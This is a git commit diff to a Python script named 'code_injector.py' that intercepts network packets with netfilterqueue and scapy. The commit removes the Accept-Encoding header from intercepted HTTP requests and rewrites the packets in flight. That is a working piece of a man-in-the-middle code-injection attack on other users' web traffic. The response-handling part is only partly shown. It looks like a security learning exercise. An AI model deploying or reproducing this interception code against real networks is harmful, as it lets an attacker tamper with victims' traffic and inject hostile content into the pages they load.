c0fe209e9f712e42a78f23a22a79c6c8b7918abb
Kevin Shaji <ckevin.shaji@gmail.com>
2020-03-11 11:35:20 +0530

    Modified request to avoid encoding

--- code_injector.py
+++ code_injector.py
@@ -1,5 +1,6 @@
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 ack_list = []
 
@@ -17,7 +18,9 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request ")
-            print(scapy_packet.show())
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response ")
